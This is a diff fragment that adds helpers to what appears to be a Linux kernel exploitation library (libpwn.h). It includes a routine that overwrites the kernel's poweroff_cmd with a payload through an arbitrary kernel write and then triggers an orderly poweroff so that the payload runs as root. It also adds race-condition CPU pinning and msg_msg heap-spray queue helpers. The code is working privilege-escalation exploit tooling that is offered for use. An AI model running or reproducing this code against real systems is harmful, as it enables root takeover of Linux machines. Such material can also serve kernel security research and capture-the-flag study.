+    prepare_file_copy_helper(DEFAULT_POWEROFF_HELPER, filename,
+                             DEFAULT_POWEROFF_RESULT);
+    kwrite(poweroff_cmd, POWEROFF_CMD_PAYLOAD, POWEROFF_CMD_PAYLOAD_LEN);
+
+    log_success("[+] poweroff_cmd <- %s", POWEROFF_CMD_PAYLOAD);
+    trigger_orderly_poweroff();
+
+    if (!wait_for_readable_file(DEFAULT_POWEROFF_RESULT, 300, 10000))
+        die_msg("poweroff helper did not create a readable result");
+
+    print_file(DEFAULT_POWEROFF_RESULT);
+}
+
+/* -------------------------- race helpers -------------------------- */
+
+static void bind_cpu(int core)
+{
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(core, &set);
+
+    if (sched_setaffinity(0, sizeof(set), &set) < 0)
+        error("sched_setaffinity");
+}
+
+/* -------------------------- msg_msg helpers -------------------------- */
+
+static int make_queue(key_t key, int msgflg)
+{
+    int result = msgget(key, msgflg);
+    if (result == -1)
+        error("msgget");
+    return result;
+}
+
+static void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp,
+                    int msgflg)
+{
+    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
+        error("msgrcv");
+}
+
+static void send_msg(int msqid, const void *msgp, size_t msgsz, int msgflg)
+{
+    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
+        error("msgsnd");
+}
+
+/* -------------------------- misc helpers -------------------------- */
+
+static void dump_hex(const void *buf, size_t size)
+{
+    const unsigned long *q = buf;
+    size_t count = size / sizeof(*q);
+
+    for (size_t i = 0; i < count; i++)
+        printf(SUCCESS_MSG("[+] %zu - 0x%016lx\n"), i, q[i]);
+}
+
+static void ppause(void)
+{
+    log_info("[*] Press Enter to continue");
+    (void)getchar();
+}
+
+static void info(const char *msg, unsigned long val)
+{
+    printf(INFO_MSG("[*] %s: 0x%016lx\n"), msg, val);
+}
 
 #endif /* LIBPWN_H */
